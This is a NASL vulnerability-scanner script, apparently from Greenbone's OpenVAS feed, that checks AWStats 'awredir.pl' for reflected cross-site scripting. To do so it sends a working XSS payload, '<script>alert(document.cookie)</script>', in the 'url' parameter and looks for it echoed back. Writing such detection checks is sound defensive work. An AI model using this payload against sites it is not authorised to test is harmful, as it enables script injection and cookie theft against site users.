# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:awstats:awstats";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802251");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-10-04 16:55:13 +0200 (Tue, 04 Oct 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("AWStats 'awredir.pl' Multiple Cross-Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://websecurity.com.ua/5380/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49749");
  script_xref(name:"URL", value:"http://secunia.com/advisories/46160");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105307/awstats-sqlxsssplit.txt");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("awstats_detect.nasl");
  script_mandatory_keys("awstats/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"AWStats version 6.95 and 7.0");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied input via the
'url' and 'key' parameters to awredir.pl, which allows attackers to execute arbitrary HTML and script code in a
user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to version 7.1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"AWStats is prone to multiple cross site scripting vulnerabilities.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/awredir.pl?url=<script>alert(document.cookie)</script>";

if (http_vuln_check(port: port, url: url, check_header: TRUE,
                    pattern: "<script>alert\(document.cookie\)</script>")) {
  report = http_report_vuln_url(url: url, port: port);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
